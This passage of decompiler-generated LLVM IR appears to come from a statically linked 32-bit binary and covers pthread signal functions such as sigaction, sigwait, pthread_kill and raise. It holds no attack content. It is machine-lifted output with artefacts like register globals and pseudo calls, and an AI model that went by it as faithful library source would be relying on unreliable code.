  %v0_80581f8 = load i32, i32* @eax, align 4
  ret i32 %v0_80581f8
}

define i32 @thread_self.2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80581f9 = load i32, i32* @esp, align 4
  %v1_80581f9 = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_80581f9 = icmp ult i32 %v0_80581f9, %v1_80581f9
  %v1_8058206 = icmp eq i1 %v7_80581f9, false
  br i1 %v1_8058206, label %dec_label_pc_8058237, label %dec_label_pc_8058208

dec_label_pc_8058208:                             ; preds = %entry
  %v1_8058208 = load i32, i32* @global_var_8079c50.566, align 16
  %v7_8058208 = icmp ult i32 %v0_80581f9, %v1_8058208
  br i1 %v7_8058208, label %dec_label_pc_805821d, label %dec_label_pc_8058210

dec_label_pc_8058210:                             ; preds = %dec_label_pc_8058208
  %v1_8058210 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_8058210 = icmp ult i32 %v0_80581f9, %v1_8058210
  br i1 %v7_8058210, label %dec_label_pc_8058237, label %dec_label_pc_805821d

dec_label_pc_805821d:                             ; preds = %dec_label_pc_8058210, %dec_label_pc_8058208
  %v0_805821d = load i32, i32* @global_var_807f358.569, align 8
  %v1_805821d = icmp eq i32 %v0_805821d, 0
  br i1 %v1_805821d, label %dec_label_pc_805822b, label %dec_label_pc_8058226

dec_label_pc_8058226:                             ; preds = %dec_label_pc_805821d
  %v0_8058226 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805822b

dec_label_pc_805822b:                             ; preds = %dec_label_pc_805821d, %dec_label_pc_8058226
  %v2_8058231 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8058237

dec_label_pc_8058237:                             ; preds = %dec_label_pc_8058210, %entry, %dec_label_pc_805822b
  %v0_8058237 = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_8058210 ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_8058231, %dec_label_pc_805822b ]
  ret i32 %v0_8058237

; uselistorder directives
  uselistorder label %dec_label_pc_8058237, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805822b, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8058238 = load i32, i32* @edi, align 4
  %v0_8058239 = load i32, i32* @esi, align 4
  %v0_805823a = load i32, i32* @ebx, align 4
  store i32 %v0_805823a, i32* %stack_var_-12, align 4
  %v3_805823b = call i32 @thread_self.2(i32 %v0_805823a, i32 %v0_8058239, i32 %v0_8058238)
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8058244 = add i32 %v3_805823b, 88
  %v2_8058244 = inttoptr i32 %v1_8058244 to i8*
  %v3_8058244 = load i8, i8* %v2_8058244, align 1
  %v4_8058244 = icmp eq i8 %v3_8058244, 0
  store i32 %v3_805823b, i32* %ebx.global-to-local, align 4
  br i1 %v4_8058244, label %dec_label_pc_8058255, label %dec_label_pc_805824c

dec_label_pc_805824c:                             ; preds = %entry
  store i8 0, i8* %v2_8058244, align 1
  %v0_8058250 = load i32, i32* %edi.global-to-local, align 4
  %v2_8058250 = add i32 %v3_805823b, 32
  %v3_8058250 = inttoptr i32 %v2_8058250 to i32*
  store i32 %v0_8058250, i32* %v3_8058250, align 4
  br label %dec_label_pc_805827e

dec_label_pc_8058255:                             ; preds = %entry
  %v4_805823a = ptrtoint i32* %stack_var_-12 to i32
  %v1_8058255 = add i32 %v3_805823b, 84
  %v2_8058255 = inttoptr i32 %v1_8058255 to i32*
  %v3_8058255 = load i32, i32* %v2_8058255, align 4
  %v1_8058258 = icmp eq i32 %v3_8058255, 0
  store i32 %v4_805823a, i32* %v2_8058255, align 4
  %v0_8058268 = load i32, i32* %edi.global-to-local, align 4
  %v5_8058269 = mul i32 %v0_8058268, 4
  %v6_8058269 = add i32 %v5_8058269, ptrtoint (i32* @global_var_8079b40.600 to i32)
  %v7_8058269 = inttoptr i32 %v6_8058269 to i32*
  %v8_8058269 = load i32, i32* %v7_8058269, align 4
  call void @__pseudo_call(i32 %v8_8058269)
  %v1_8058275 = icmp eq i1 %v1_8058258, false
  br i1 %v1_8058275, label %dec_label_pc_805827e, label %dec_label_pc_8058277

dec_label_pc_8058277:                             ; preds = %dec_label_pc_8058255
  %v0_8058277 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058277 = add i32 %v0_8058277, 84
  %v2_8058277 = inttoptr i32 %v1_8058277 to i32*
  store i32 0, i32* %v2_8058277, align 4
  br label %dec_label_pc_805827e

dec_label_pc_805827e:                             ; preds = %dec_label_pc_8058255, %dec_label_pc_805824c, %dec_label_pc_8058277
  %v2_805827e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805827e, i32* %ebx.global-to-local, align 4
  store i32 %v0_8058238, i32* %edi.global-to-local, align 4
  ret i32 %v3_805823b

; uselistorder directives
  uselistorder i32 %v3_805823b, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805827e, { 2, 0, 1 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8058282 = load i32, i32* @edi, align 4
  %v0_8058283 = load i32, i32* @esi, align 4
  %v0_8058284 = load i32, i32* @ebx, align 4
  store i32 %v0_8058284, i32* %stack_var_-12, align 4
  %v3_8058285 = call i32 @thread_self.2(i32 %v0_8058284, i32 %v0_8058283, i32 %v0_8058282)
  store i32 %v3_8058285, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805828e = add i32 %v3_8058285, 88
  %v2_805828e = inttoptr i32 %v1_805828e to i8*
  %v3_805828e = load i8, i8* %v2_805828e, align 1
  %v4_805828e = icmp eq i8 %v3_805828e, 0
  store i32 %v3_8058285, i32* %ebx.global-to-local, align 4
  br i1 %v4_805828e, label %dec_label_pc_805829f, label %dec_label_pc_8058296

dec_label_pc_8058296:                             ; preds = %entry
  store i8 0, i8* %v2_805828e, align 1
  %v0_805829a = load i32, i32* @esi, align 4
  %v1_805829a = load i32, i32* %eax.global-to-local, align 4
  %v2_805829a = add i32 %v1_805829a, 32
  %v3_805829a = inttoptr i32 %v2_805829a to i32*
  store i32 %v0_805829a, i32* %v3_805829a, align 4
  br label %dec_label_pc_80582d6

dec_label_pc_805829f:                             ; preds = %entry
  %v4_8058284 = ptrtoint i32* %stack_var_-12 to i32
  %v1_805829f = add i32 %v3_8058285, 84
  %v2_805829f = inttoptr i32 %v1_805829f to i32*
  %v3_805829f = load i32, i32* %v2_805829f, align 4
  %v1_80582a2 = icmp eq i32 %v3_805829f, 0
  store i32 %v4_8058284, i32* %v2_805829f, align 4
  %v2_80582ae = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_80582ae, i32* %eax.global-to-local, align 4
  %v3_80582b8 = bitcast i32* %stack_var_-104 to i16*
  %v4_80582b8 = call i32 @memcpy(i16* %v3_80582b8, i32 %v2_80582ae, i32 88)
  store i32 %v4_80582b8, i32* %eax.global-to-local, align 4
  %v0_80582c0 = load i32, i32* @esi, align 4
  %v5_80582c1 = mul i32 %v0_80582c0, 4
  %v6_80582c1 = add i32 %v5_80582c1, ptrtoint (i32* @global_var_8079b40.600 to i32)
  %v7_80582c1 = inttoptr i32 %v6_80582c1 to i32*
  %v8_80582c1 = load i32, i32* %v7_80582c1, align 4
  call void @__pseudo_call(i32 %v8_80582c1)
  %v1_80582cd = icmp eq i1 %v1_80582a2, false
  br i1 %v1_80582cd, label %dec_label_pc_80582d6, label %dec_label_pc_80582cf

dec_label_pc_80582cf:                             ; preds = %dec_label_pc_805829f
  %v0_80582cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80582cf = add i32 %v0_80582cf, 84
  %v2_80582cf = inttoptr i32 %v1_80582cf to i32*
  store i32 0, i32* %v2_80582cf, align 4
  br label %dec_label_pc_80582d6

dec_label_pc_80582d6:                             ; preds = %dec_label_pc_805829f, %dec_label_pc_8058296, %dec_label_pc_80582cf
  %v2_80582d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80582d6, i32* %ebx.global-to-local, align 4
  %v0_80582d9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80582d9

; uselistorder directives
  uselistorder i32 %v3_8058285, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_80582d6, { 2, 0, 1 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %stack_var_-156 = alloca i32, align 4
  %v0_80582db = load i32, i32* @edi, align 4
  %v0_80582dc = load i32, i32* @esi, align 4
  %v0_80582dd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80582eb = load i32, i32* @global_var_8075308.602, align 8
  %v12_80582eb = icmp eq i32 %v1_80582eb, %arg1
  br i1 %v12_80582eb, label %dec_label_pc_80583a3, label %dec_label_pc_8058305

dec_label_pc_8058305:                             ; preds = %entry
  %v1_8058305 = load i32, i32* @global_var_807530c.586, align 4
  %v12_8058305 = icmp eq i32 %v1_8058305, %arg1
  br i1 %v12_8058305, label %dec_label_pc_80583a3, label %dec_label_pc_8058311

dec_label_pc_8058311:                             ; preds = %dec_label_pc_8058305
  %v1_8058311 = load i32, i32* @global_var_8075310.577, align 16
  %v12_8058311 = icmp eq i32 %v1_8058311, %arg1
  %v1_8058317 = icmp eq i1 %v12_8058311, false
  br i1 %v1_8058317, label %dec_label_pc_8058321, label %dec_label_pc_8058319

dec_label_pc_8058319:                             ; preds = %dec_label_pc_8058311
  %tmp22 = icmp slt i32 %arg1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_80583a3, label %dec_label_pc_8058321

dec_label_pc_8058321:                             ; preds = %dec_label_pc_8058319, %dec_label_pc_8058311
  %v1_8058323 = icmp eq i32* %arg2, null
  %.pre = ptrtoint i32* %stack_var_-156 to i32
  br i1 %v1_8058323, label %dec_label_pc_8058321.dec_label_pc_805836c_crit_edge, label %dec_label_pc_8058327

dec_label_pc_8058321.dec_label_pc_805836c_crit_edge: ; preds = %dec_label_pc_8058321
  br label %dec_label_pc_805836c

dec_label_pc_8058327:                             ; preds = %dec_label_pc_8058321
  store i32 %.pre, i32* @esi, align 4
  %v3_8058333 = bitcast i32* %stack_var_-156 to i16*
  %v4_8058333 = call i32 @memcpy(i16* %v3_8058333, i32 %tmp9, i32 140)
  %v2_805833b = load i32, i32* %arg2, align 4
  %tmp = or i32 %v2_805833b, 1
  %tmp25 = icmp eq i32 %tmp, 1
  br i1 %tmp25, label %dec_label_pc_8058368, label %dec_label_pc_8058340

dec_label_pc_8058340:                             ; preds = %dec_label_pc_8058327
  %tmp24 = icmp slt i32 %arg1, 1
  br i1 %tmp24, label %dec_label_pc_8058368, label %dec_label_pc_8058344

dec_label_pc_8058344:                             ; preds = %dec_label_pc_8058340
  %v1_8058344 = add i32 %arg1, -64
  %v3_8058344 = sub i32 63, %arg1
  %v4_8058344 = and i32 %v3_8058344, %arg1
  %v5_8058344 = icmp slt i32 %v4_8058344, 0
  %v6_8058344 = icmp eq i32 %v1_8058344, 0
  %v7_8058344 = icmp slt i32 %v1_8058344, 0
  %v3_8058347 = icmp eq i1 %v7_8058344, %v5_8058344
  %v4_8058347 = icmp eq i1 %v6_8058344, false
  %v5_8058347 = and i1 %v4_8058347, %v3_8058347
  br i1 %v5_8058347, label %dec_label_pc_8058368, label %dec_label_pc_8058349

dec_label_pc_8058349:                             ; preds = %dec_label_pc_8058344
  %v1_8058349 = add i32 %tmp9, 132
  %v2_8058349 = inttoptr i32 %v1_8058349 to i8*
  %v3_8058349 = load i8, i8* %v2_8058349, align 1
  %v4_8058349 = and i8 %v3_8058349, 4
  %v5_8058349 = icmp eq i8 %v4_8058349, 0
  %. = select i1 %v5_8058349, i32 134578818, i32 134578744
  store i32 %., i32* %stack_var_-156, align 4
  br label %dec_label_pc_805836c

dec_label_pc_8058368:                             ; preds = %dec_label_pc_8058344, %dec_label_pc_8058340, %dec_label_pc_8058327
  br label %dec_label_pc_805836c

dec_label_pc_805836c:                             ; preds = %dec_label_pc_8058321.dec_label_pc_805836c_crit_edge, %dec_label_pc_8058349, %dec_label_pc_8058368
  %v0_805836e = phi i32 [ 0, %dec_label_pc_8058321.dec_label_pc_805836c_crit_edge ], [ %.pre, %dec_label_pc_8058349 ], [ %.pre, %dec_label_pc_8058368 ]
  %v3_8058370 = inttoptr i32 %v0_805836e to i32*
  %v4_8058370 = call i32 @__libc_sigaction(i32 %arg1, i32* %v3_8058370, i32 %.pre)
  store i32 -1, i32* @edx, align 4
  %v8_805837b = icmp eq i32 %v4_8058370, -1
  br i1 %v8_805837b, label %dec_label_pc_80583ac, label %dec_label_pc_805837e

dec_label_pc_805837e:                             ; preds = %dec_label_pc_805836c
  %v1_805837e = add i32 %arg1, -1
  %v6_8058384 = icmp ugt i32 %v1_805837e, 63
  br i1 %v6_8058384, label %dec_label_pc_80583aa, label %dec_label_pc_8058386

dec_label_pc_8058386:                             ; preds = %dec_label_pc_805837e
  %v1_8058386 = icmp eq i32 %arg3, 0
  br i1 %v1_8058386, label %dec_label_pc_8058394, label %dec_label_pc_805838a

dec_label_pc_805838a:                             ; preds = %dec_label_pc_8058386
  %v1_805838a = mul i32 %arg1, 4
  %v2_805838a = add i32 %v1_805838a, ptrtoint (i32* @global_var_8079b40.600 to i32)
  %v3_805838a = inttoptr i32 %v2_805838a to i32*
  %v4_805838a = load i32, i32* %v3_805838a, align 4
  %v2_8058391 = inttoptr i32 %arg3 to i32*
  store i32 %v4_805838a, i32* %v2_8058391, align 4
  br label %dec_label_pc_8058394

dec_label_pc_8058394:                             ; preds = %dec_label_pc_8058386, %dec_label_pc_805838a
  br i1 %v1_8058323, label %dec_label_pc_80583aa, label %dec_label_pc_8058398

dec_label_pc_8058398:                             ; preds = %dec_label_pc_8058394
  %v2_8058398 = load i32, i32* %arg2, align 4
  %v2_805839a = mul i32 %arg1, 4
  %v3_805839a = add i32 %v2_805839a, ptrtoint (i32* @global_var_8079b40.600 to i32)
  %v4_805839a = inttoptr i32 %v3_805839a to i32*
  store i32 %v2_8058398, i32* %v4_805839a, align 4
  br label %dec_label_pc_80583aa

dec_label_pc_80583a3:                             ; preds = %dec_label_pc_8058319, %dec_label_pc_8058305, %entry
  store i32 22, i32* @edx, align 4
  br label %dec_label_pc_80583ac

dec_label_pc_80583aa:                             ; preds = %dec_label_pc_8058394, %dec_label_pc_805837e, %dec_label_pc_8058398
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_80583ac

dec_label_pc_80583ac:                             ; preds = %dec_label_pc_805836c, %dec_label_pc_80583a3, %dec_label_pc_80583aa
  %v0_80583b2 = phi i32 [ -1, %dec_label_pc_805836c ], [ 22, %dec_label_pc_80583a3 ], [ 0, %dec_label_pc_80583aa ]
  store i32 %v0_80582dd, i32* @ebx, align 4
  store i32 %v0_80582dc, i32* @esi, align 4
  store i32 %v0_80582db, i32* @edi, align 4
  ret i32 %v0_80583b2

; uselistorder directives
  uselistorder i32 %v1_8058344, { 1, 0 }
  uselistorder i32 %.pre, { 0, 3, 2, 1 }
  uselistorder i1 %v1_8058323, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 7, 6, 9, 8, 3, 11, 10, 4, 5, 0, 1, 2, 12 }
  uselistorder label %dec_label_pc_80583ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80583aa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058394, { 1, 0 }
  uselistorder label %dec_label_pc_805836c, { 2, 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-440 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_80583b9 = load i32, i32* @edi, align 4
  %v0_80583ba = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  %v0_80583c0 = load i32, i32* @ebx, align 4
  %v3_80583c7 = call i32 @thread_self.2(i32 %v0_80583c0, i32 %v0_80583ba, i32 %v0_80583b9)
  store i32 %arg1, i32* @edi, align 4
  %v2_80583dd = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80583dd, i32* @ebx, align 4
  %v1_80583e5 = call i32 @sigfillset(i32 %v2_80583dd)
  %v1_80583f3 = call i32 @__GI_sigdelset(i32 %v2_80583dd)
  %v0_8058482.pr = load i32, i32* @esi, align 4
  %v2_8058453 = ptrtoint i32* %stack_var_-280 to i32
  %v2_805845a = ptrtoint i32* %stack_var_-284 to i32
  %v7_805848528 = icmp sgt i32 %v0_8058482.pr, 65
  br i1 %v7_805848528, label %dec_label_pc_805848b, label %dec_label_pc_8058400.lr.ph

dec_label_pc_8058400.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8058400

dec_label_pc_8058400:                             ; preds = %dec_label_pc_8058400.lr.ph, %dec_label_pc_8058481
  %v0_805840230 = phi i32 [ %v0_8058482.pr, %dec_label_pc_8058400.lr.ph ], [ %v1_8058481, %dec_label_pc_8058481 ]
  %v3_805840429 = phi i32 [ %v1_80583f3, %dec_label_pc_8058400.lr.ph ], [ %v0_805848b2, %dec_label_pc_8058481 ]
  %v0_8058403 = load i32, i32* @edi, align 4
  %v4_8058404 = call i32 @sigismember(i32 %v0_8058403, i32 %v0_805840230, i32 %v3_805840429, i32 %v3_805840429)
  %v1_805840c = icmp eq i32 %v4_8058404, 0
  br i1 %v1_805840c, label %dec_label_pc_8058481, label %dec_label_pc_8058410

dec_label_pc_8058410:                             ; preds = %dec_label_pc_8058400
  %v0_8058410 = load i32, i32* @esi, align 4
  %v1_8058410 = load i32, i32* @global_var_8075308.602, align 8
  %v12_8058410 = icmp eq i32 %v0_8058410, %v1_8058410
  br i1 %v12_8058410, label %dec_label_pc_8058481, label %dec_label_pc_8058418

dec_label_pc_8058418:                             ; preds = %dec_label_pc_8058410
  %v1_8058418 = load i32, i32* @global_var_807530c.586, align 4
  %v12_8058418 = icmp eq i32 %v0_8058410, %v1_8058418
  br i1 %v12_8058418, label %dec_label_pc_8058481, label %dec_label_pc_8058420

dec_label_pc_8058420:                             ; preds = %dec_label_pc_8058418
  %v1_8058420 = load i32, i32* @global_var_8075310.577, align 16
  %v12_8058420 = icmp eq i32 %v0_8058410, %v1_8058420
  br i1 %v12_8058420, label %dec_label_pc_8058481, label %dec_label_pc_8058428

dec_label_pc_8058428:                             ; preds = %dec_label_pc_8058420
  %v1_8058433 = call i32 @__GI_sigdelset(i32 %v2_80583dd)
  %v0_805843b = load i32, i32* @esi, align 4
  %v1_805843b = mul i32 %v0_805843b, 4
  %v2_805843b = add i32 %v1_805843b, ptrtoint (i32* @global_var_8079b40.600 to i32)
  %v3_805843b = inttoptr i32 %v2_805843b to i32*
  %v4_805843b = load i32, i32* %v3_805843b, align 4
  %tmp = or i32 %v4_805843b, 1
  %tmp31 = icmp eq i32 %tmp, 1
  br i1 %tmp31, label %dec_label_pc_8058445, label %dec_label_pc_8058481

dec_label_pc_8058445:                             ; preds = %dec_label_pc_8058428
  store i32 134578680, i32* %stack_var_-284, align 4
  store i32 %v2_805845a, i32* @ebx, align 4
  %v1_8058462 = call i32 @sigemptyset(i32 %v2_8058453)
  %v0_8058478 = load i32, i32* @esi, align 4
  %v4_8058479 = call i32 @__GI_sigaction(i32 %v0_8058478, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_8058481

dec_label_pc_8058481:                             ; preds = %dec_label_pc_8058428, %dec_label_pc_8058420, %dec_label_pc_8058418, %dec_label_pc_8058410, %dec_label_pc_8058400, %dec_label_pc_8058445
  %v0_805848b2 = phi i32 [ %v1_8058433, %dec_label_pc_8058428 ], [ %v4_8058404, %dec_label_pc_8058420 ], [ %v4_8058404, %dec_label_pc_8058418 ], [ %v4_8058404, %dec_label_pc_8058410 ], [ 0, %dec_label_pc_8058400 ], [ %v4_8058479, %dec_label_pc_8058445 ]
  %v0_8058481 = load i32, i32* @esi, align 4
  %v1_8058481 = add i32 %v0_8058481, 1
  store i32 %v1_8058481, i32* @esi, align 4
  %v7_8058485 = icmp sgt i32 %v1_8058481, 65
  br i1 %v7_8058485, label %dec_label_pc_805848b, label %dec_label_pc_8058400

dec_label_pc_805848b:                             ; preds = %dec_label_pc_8058481, %entry
  %v2_805848f = ptrtoint i32* %stack_var_-440 to i32
  %v3_8058494 = call i32 @__sigsetjmp(i32 %v2_805848f, i32* inttoptr (i32 1 to i32*))
  %v1_805849c = icmp eq i32 %v3_8058494, 0
  %v1_805849e = icmp eq i1 %v1_805849c, false
  br i1 %v1_805849e, label %dec_label_pc_805848b.dec_label_pc_80584f4_crit_edge, label %dec_label_pc_80584a0

dec_label_pc_805848b.dec_label_pc_80584f4_crit_edge: ; preds = %dec_label_pc_805848b
  %.pre = add i32 %v3_80583c7, 40
  %.pre3 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_80584f4

dec_label_pc_80584a0:                             ; preds = %dec_label_pc_805848b
  %v2_80584ab = add i32 %v3_80583c7, 40
  %v3_80584ab = inttoptr i32 %v2_80584ab to i32*
  store i32 %v2_805848f, i32* %v3_80584ab, align 4
  %v1_80584b5 = add i32 %v3_80583c7, 66
  %v2_80584b5 = inttoptr i32 %v1_80584b5 to i8*
  %v3_80584b5 = load i8, i8* %v2_80584b5, align 1
  %v4_80584b5 = icmp eq i8 %v3_80584b5, 0
  br i1 %v4_80584b5, label %dec_label_pc_80584c8, label %dec_label_pc_80584bb

dec_label_pc_80584bb:                             ; preds = %dec_label_pc_80584a0
  %v1_80584c2 = add i32 %v3_80583c7, 64
  %v2_80584c2 = inttoptr i32 %v1_80584c2 to i8*
  %v3_80584c2 = load i8, i8* %v2_80584c2, align 1
  %v4_80584c2 = icmp eq i8 %v3_80584c2, 0
  br i1 %v4_80584c2, label %dec_label_pc_80584f4, label %dec_label_pc_80584c8

dec_label_pc_80584c8:                             ; preds = %dec_label_pc_80584bb, %dec_label_pc_80584a0
  %v1_80584cf = add i32 %v3_80583c7, 32
  %v2_80584cf = inttoptr i32 %v1_80584cf to i32*
  store i32 0, i32* %v2_80584cf, align 4
  %v1_80584e0 = add i32 %v3_80583c7, 88
  %v2_80584e0 = inttoptr i32 %v1_80584e0 to i8*
  store i8 1, i8* %v2_80584e0, align 1
  %v1_80584ec = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_80584ec = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_80584ec)
  br label %dec_label_pc_80584f4

dec_label_pc_80584f4:                             ; preds = %dec_label_pc_805848b.dec_label_pc_80584f4_crit_edge, %dec_label_pc_80584bb, %dec_label_pc_80584c8
  %v2_80584fb.pre-phi = phi i32* [ %.pre3, %dec_label_pc_805848b.dec_label_pc_80584f4_crit_edge ], [ %v3_80584ab, %dec_label_pc_80584bb ], [ %v3_80584ab, %dec_label_pc_80584c8 ]
  store i32 0, i32* %v2_80584fb.pre-phi, align 4
  %v0_8058502 = call i32 @pthread_testcancel()
  %v1_8058515 = add i32 %v3_80583c7, 32
  %v2_8058515 = inttoptr i32 %v1_8058515 to i32*
  %v3_8058515 = load i32, i32* %v2_8058515, align 4
  store i32 %v3_8058515, i32* %arg2, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8058481, { 0, 2, 1 }
  uselistorder i32 %v4_8058404, { 3, 2, 1, 0 }
  uselistorder i32 %v3_805840429, { 1, 0 }
  uselistorder i32 %v3_80583c7, { 6, 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @thread_self.2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80584f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058481, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8058400, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8058526 = load i32, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v0_8058529 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8058533 = urem i32 %arg1, 1024
  %v2_8058538 = mul nuw nsw i32 %v1_8058533, 16
  %v1_805853b = add i32 %v2_8058538, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_805853b, i32* @esi, align 4
  store i32 %v1_805853b, i32* @eax, align 4
  %v1_8058543 = call i32 @__pthread_lock(i32 %v0_8058529)
  %v0_8058548 = load i32, i32* @esi, align 4
  %v1_8058548 = add i32 %v0_8058548, 8
  %v2_8058548 = inttoptr i32 %v1_8058548 to i32*
  %v3_8058548 = load i32, i32* %v2_8058548, align 4
  %v1_805854b = icmp eq i32 %v3_8058548, 0
  br i1 %v1_805854b, label %dec_label_pc_8058554, label %dec_label_pc_805854f

dec_label_pc_805854f:                             ; preds = %entry
  %v1_805854f = add i32 %v3_8058548, 16
  %v2_805854f = inttoptr i32 %v1_805854f to i32*
  %v3_805854f = load i32, i32* %v2_805854f, align 4
  %v4_805854f = load i32, i32* @ebx, align 4
  %v15_805854f = icmp eq i32 %v3_805854f, %v4_805854f
  br i1 %v15_805854f, label %dec_label_pc_8058567, label %dec_label_pc_8058554

dec_label_pc_8058554:                             ; preds = %dec_label_pc_805854f, %entry
  store i32 %v0_8058548, i32* %stack_var_-28, align 4
  %v1_8058558 = inttoptr i32 %v0_8058548 to i32*
  %v2_8058558 = call i32 @__pthread_unlock(i32* %v1_8058558)
  br label %dec_label_pc_805858e

dec_label_pc_8058567:                             ; preds = %dec_label_pc_805854f
  %v1_805856a = add i32 %v3_8058548, 20
  %v2_805856a = inttoptr i32 %v1_805856a to i32*
  %v3_805856a = load i32, i32* %v2_805856a, align 4
  store i32 %v3_805856a, i32* @ebx, align 4
  store i32 %v0_8058548, i32* %stack_var_-28, align 4
  %v1_805856e = inttoptr i32 %v0_8058548 to i32*
  %v2_805856e = call i32 @__pthread_unlock(i32* %v1_805856e)
  %v0_8058579 = load i32, i32* @ebx, align 4
  store i32 %v0_8058579, i32* %stack_var_-28, align 4
  %v2_805857a = call i32 @kill(i32 %v0_8058579, i32 %arg2)
  %v8_8058584 = icmp eq i32 %v2_805857a, -1
  %v1_8058585 = icmp eq i1 %v8_8058584, false
  br i1 %v1_8058585, label %dec_label_pc_805858e, label %dec_label_pc_8058587

dec_label_pc_8058587:                             ; preds = %dec_label_pc_8058567
  %v0_8058587 = load i32, i32* %stack_var_-28, align 4
  %v1_8058587 = call i32 @__errno_location(i32 %v0_8058587)
  %v1_805858c = inttoptr i32 %v1_8058587 to i32*
  %v2_805858c = load i32, i32* %v1_805858c, align 4
  br label %dec_label_pc_805858e

dec_label_pc_805858e:                             ; preds = %dec_label_pc_8058567, %dec_label_pc_8058554, %dec_label_pc_8058587
  %v0_805858f = phi i32 [ 0, %dec_label_pc_8058567 ], [ 3, %dec_label_pc_8058554 ], [ %v2_805858c, %dec_label_pc_8058587 ]
  store i32 %v0_8058526, i32* @esi, align 4
  ret i32 %v0_805858f

; uselistorder directives
  uselistorder i32 %v3_8058548, { 1, 0, 2 }
  uselistorder i32 %v0_8058548, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_805858e, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058594 = load i32, i32* @ebx, align 4
  store i32 %v0_8058594, i32* %stack_var_-4, align 4
  %v1_8058598 = call i32 @__GI_pthread_self(i32 %v0_8058594)
  %v0_805859d = load i32, i32* @ebx, align 4
  store i32 %v1_8058598, i32* %stack_var_-28, align 4
  %v4_80585a4 = call i32 @pthread_kill(i32 %v1_8058598, i32 %arg1, i32 %v0_805859d, i32 %v0_805859d)
  %v1_80585b0 = icmp eq i32 %v4_80585a4, 0
  br i1 %v1_80585b0, label %dec_label_pc_80585be, label %dec_label_pc_80585b4

dec_label_pc_80585b4:                             ; preds = %entry
  %v0_80585b4 = load i32, i32* %stack_var_-28, align 4
  %v1_80585b4 = call i32 @__errno_location(i32 %v0_80585b4)
  %v2_80585b9 = inttoptr i32 %v1_80585b4 to i32*
  store i32 %v4_80585a4, i32* %v2_80585b9, align 4
  br label %dec_label_pc_80585be

dec_label_pc_80585be:                             ; preds = %entry, %dec_label_pc_80585b4
  %v0_80585c1 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_80585b4 ]
  %v2_80585c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80585c0, i32* @ebx, align 4
  ret i32 %v0_80585c1

; uselistorder directives
  uselistorder i32 %v4_80585a4, { 1, 0 }
  uselistorder i32 %v1_8058598, { 1, 0 }
